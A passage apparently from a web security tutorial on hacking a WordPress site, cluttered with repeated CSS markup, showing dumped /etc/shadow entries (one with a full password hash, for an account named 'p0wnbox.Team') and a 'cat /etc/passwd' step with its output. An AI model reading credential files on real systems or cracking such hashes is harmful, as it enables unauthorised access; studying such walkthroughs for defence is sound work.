`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">games:*:14495:0:99999:7::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">gopher:*:14495:0:99999:7::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">ftp:*:14495:0:99999:7::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">nobody:*:14495:0:99999:7::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">vcsa:!!:14557:::::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">avahi-autoipd:!!:14557:::::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">ntp:!!:14557:::::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">dbus:!!:14557:::::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">rtkit:!!:14557:::::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">nscd:!!:14557:::::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">tcpdump:!!:14557:::::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">avahi:!!:14557:::::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">haldaemon:!!:14557:::::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">openvpn:!!:14557:::::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">apache:!!:14557:::::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">saslauth:!!:14557:::::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">mailnull:!!:14557:::::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">smmsp:!!:14557:::::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">smolt:!!:14557:::::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">sshd:!!:14557:::::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">pulse:!!:14557:::::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">gdm:!!:14557:::::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">p0wnbox.Team:$6$rPArLuwe8rM9Avwv$a5coOdUCQQY7NgvTnXaFj2D5SmggRrFsr6TP8g7IATVeEt37LUGJYvHM1myhelCyPkIjd8Yv5olMnUhwbQL76/:14981:0:99999:7::: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">mysql:!!:14981::::::`

 

  

 

And view /etc/passwd file

[?](http://resources.infosecinstitute.com/hacking-a-wordpress-site/#)

 01

02

03

04

05

06

07

08

09

10

11

12

13

14

15

16

17

18

19

20

21

22

23

24

25

26

27

28

29

30

31

32

33

34

35

36

37

  `<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">cat /etc/passwd `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">root:x:0:0:root:/root:/bin/bash `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">bin:x:1:1:bin:/bin:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">daemon:x:2:2:daemon:/sbin:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">adm:x:3:4:adm:/var/adm:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">sync:x:5:0:sync:/sbin:/bin/sync `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">halt:x:7:0:halt:/sbin:/sbin/halt `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">operator:x:11:0:operator:/root:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">games:x:12:100:games:/usr/games:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">gopher:x:13:30:gopher:/var/gopher:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">nobody:x:99:99:Nobody:/:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">vcsa:x:69:499:virtual console memory owner:/dev:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">avahi-autoipd:x:499:498:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">ntp:x:38:38::/etc/ntp:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">dbus:x:81:81:System message bus:/:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">rtkit:x:498:494:RealtimeKit:/proc:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">nscd:x:28:493:NSCD Daemon:/:/sbin/nologin `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">tcpdump:x:72:72::/:/sbin/nologin `

